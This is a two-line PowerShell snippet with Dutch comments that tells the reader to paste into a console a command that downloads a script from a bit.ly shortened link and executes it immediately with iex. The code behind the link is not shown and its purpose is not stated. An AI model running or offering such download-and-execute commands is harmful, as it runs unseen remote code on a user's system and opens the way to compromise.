﻿#plak dit in een PS console:

iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")


#code te vinden op http://bit.ly/e0Mw9w